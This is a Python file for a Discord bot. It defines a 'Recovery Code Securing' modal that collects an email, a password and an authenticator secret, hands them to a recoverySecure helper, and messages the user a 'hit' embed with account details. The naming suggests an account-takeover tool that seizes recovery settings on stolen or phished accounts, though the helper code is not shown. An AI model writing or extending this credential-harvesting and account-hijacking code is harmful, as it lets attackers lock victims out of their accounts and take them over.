from discord import ui
import discord

from cogs.utils.recoverySecure import recoverySecure
from views.buttons.accountInfo import accountInfo

class recoveryModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Recovery Code Securing")
        self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
        self.add_item(ui.InputText(label="Password", placeholder="1234", required = True))
        self.add_item(ui.InputText(label="Authenticator Secret", placeholder="XXXXXXXXXXXXXXXX", required = True))

    async def callback(self, interaction: discord.Interaction):
        email = self.children[0].value
        password = self.children[1].value
        auth_secret = self.children[2].value

        await interaction.response.defer(ephemeral=True)

        await interaction.followup.send(
            embed=discord.Embed(
                title="Securing Account",
                description="Your account is being secured...",
                color=0x2765F5
            ),
            ephemeral=True
        )

        account = await recoverySecure(email, "authpwd", {"password": password, "auth_secret": auth_secret})
        if account == "invalid":
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Invalid Password / Secret",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return
        
        if not account:
            await interaction.followup.send(
                embed = discord.Embed(
                    title = "Failed to secure account",
                    description = "Make sure your password and authenticator secret are correct and 2FA is enabled",
                    color = 0x2765F5
                ),
                ephemeral = True
            )
            return
        
        await interaction.user.send(
            embed = account["hit_embed"],
            view = accountInfo(
                account["details"]
            )
        )
    